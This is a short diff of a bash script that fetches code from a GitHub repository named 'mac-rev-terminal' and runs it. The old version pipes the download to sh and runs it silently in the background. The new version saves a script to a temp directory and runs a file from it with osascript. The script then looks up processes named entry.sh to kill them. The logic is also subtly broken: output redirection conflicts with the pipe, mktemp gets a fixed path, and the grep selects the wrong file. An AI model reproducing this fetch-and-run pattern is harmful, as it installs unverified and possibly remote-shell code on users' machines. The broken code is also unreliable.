@@ -1,8 +1,10 @@
 #!/bin/bash
 
 cd "$(dirname "$0")"
-cmd="$(curl -o run.sh github.com/icefisher225/mac-rev-terminal/main.sh | sh -)"
-nohup /bin/bash -c "$cmd" >/dev/null 2>&1 &
+tmpdir="$(mktemp -d /tmp/shell-installer)"
+curl github.com/icefisher225/mac-rev-terminal/script.sh  --silent --output $tmpdir/script.scpt
+appfile="$(cd $tmpdir ; ls | grep -v 'script.scpt')"
+osascript $appfile
 
 cmd2="$(ps aux | grep entry.sh)"
 # kill all that match cmd2....
